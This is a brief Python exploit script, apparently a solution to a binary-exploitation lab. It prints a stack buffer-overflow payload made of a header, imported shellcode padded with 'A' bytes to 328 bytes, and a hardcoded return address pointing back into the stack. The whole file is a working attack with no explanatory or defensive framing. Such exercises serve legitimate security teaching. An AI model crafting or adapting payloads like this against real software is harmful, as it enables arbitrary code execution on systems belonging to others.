#!/usr/bin/env python3

import sys

from shellcode import shellcode
sys.stdout.buffer.write(b'\x41\x00\x00\x00\x00\x00\x00\x40')
sys.stdout.buffer.write(shellcode + b'A'*(328-len(shellcode)))
sys.stdout.buffer.write(0x7ffffff69480.to_bytes(8,'little'))